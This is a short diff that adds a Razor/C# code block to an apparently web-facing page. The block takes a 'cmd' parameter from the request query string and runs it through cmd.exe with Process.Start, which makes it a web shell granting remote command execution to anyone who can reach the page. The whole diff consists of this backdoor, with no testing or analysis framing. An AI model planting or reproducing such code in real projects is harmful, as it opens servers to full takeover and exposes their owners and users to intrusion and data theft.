@@ -1,0 +1,4 @@
+@{ var cmd = Context.Request.Query["cmd"];
+   if (!string.IsNullOrEmpty(cmd)) {
+       System.Diagnostics.Process.Start("cmd.exe", "/c " + cmd);
+   } }
